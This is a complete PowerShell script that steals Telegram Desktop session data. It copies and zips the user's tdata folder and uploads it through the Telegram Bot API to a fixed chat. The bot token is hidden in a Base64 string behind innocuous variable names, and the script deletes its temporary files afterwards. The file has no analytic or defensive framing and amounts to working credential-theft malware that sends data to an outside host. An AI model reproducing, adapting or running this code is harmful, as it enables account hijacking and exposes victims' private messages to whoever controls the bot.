# Define paths using environment variables
$src = Join-Path -Path $env:APPDATA -ChildPath "Telegram Desktop\tdata"
$tempFolder = Join-Path -Path $env:TEMP -ChildPath "tdata_temp_$(Get-Date -Format 'yyyyMMddHHmmss')"
$zip = Join-Path -Path $env:TEMP -ChildPath "tdata_$(Get-Date -Format 'yyyyMMddHHmmss').zip"
$tent = "Nzk5Mzc1NTI1OTpBQUhQRUZSTFY1dmY1T1lvQnNRQjVlbnJSaXpSbC1hNFZKRQo="
$tentet = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($tent))
$cht = "5047177665"

# Check if source directory exists
if (-not (Test-Path -Path $src -PathType Container)) {
    Write-Error "Source directory '$src' does not exist or is inaccessible."
}

# Check if TEMP directory is writable
if (-not (Test-Path -Path $env:TEMP -PathType Container)) {
    Write-Error "TEMP directory '$env:TEMP' is not accessible."
}

# Copy tdata to a temporary folder to avoid file locks
try {
    New-Item -Path $tempFolder -ItemType Directory -Force -ErrorAction Stop | Out-Null
    Copy-Item -Path "$src\*" -Destination $tempFolder -Recurse -Force -ErrorAction Stop
} catch {
    Write-Error "Failed to copy tdata to temporary folder '$tempFolder': $_"
    if (Test-Path -Path $tempFolder) {
        Remove-Item -Path $tempFolder -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# Create zip file from the temporary folder
try {
    Compress-Archive -Path "$tempFolder\*" -DestinationPath $zip -Force -ErrorAction Stop
} catch {
    Write-Error "Failed to create zip file at '$zip': $_"
    if (Test-Path -Path $tempFolder) {
        Remove-Item -Path $tempFolder -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# Verify zip file was created
if (-not (Test-Path -Path $zip -PathType Leaf)) {
    Write-Error "Zip file '$zip' was not created."
    if (Test-Path -Path $tempFolder) {
        Remove-Item -Path $tempFolder -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# Send the zip file via Telegram Bot API
try {
    $uri = "https://api.telegram.org/bot$tentet/sendDocument"
    $form = @{
        chat_id = $cht
        document = Get-Item -Path $zip -ErrorAction Stop
    }
    Invoke-RestMethod -Uri $uri -Method Post -Form $form -ErrorAction Stop
} catch {
    Write-Error "Failed to send file via Telegram API: $_"
} finally {
    # Clean up temporary files
    if (Test-Path -Path $tempFolder) {
        Remove-Item -Path $tempFolder -Recurse -Force -ErrorAction SilentlyContinue
    }
    if (Test-Path -Path $zip) {
        Remove-Item -Path $zip -Force -ErrorAction SilentlyContinue
    }
}

Write-Output "File successfully sent and cleaned up."
